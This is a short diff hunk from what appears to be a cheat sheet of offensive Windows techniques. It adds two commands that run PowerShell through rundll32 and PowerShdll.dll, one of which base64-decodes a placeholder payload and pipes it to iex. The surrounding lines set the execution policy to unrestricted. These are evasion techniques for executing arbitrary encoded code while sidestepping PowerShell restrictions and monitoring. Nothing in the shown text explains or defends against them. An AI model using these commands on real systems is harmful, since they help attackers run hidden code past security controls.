@@ -44,6 +44,8 @@ rundll32.exe PowerShdll.dll,main
 
 get-executionpolicy
 set-executionpolicy -scope currentuser unrestricted
+rundll32 PowerShdll.dll,main
+rundll32 Powershdll.dll,main [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("BASE64")) ^| iex
 -------------------------------------
 -------------------------------------
 8) bat2cmd
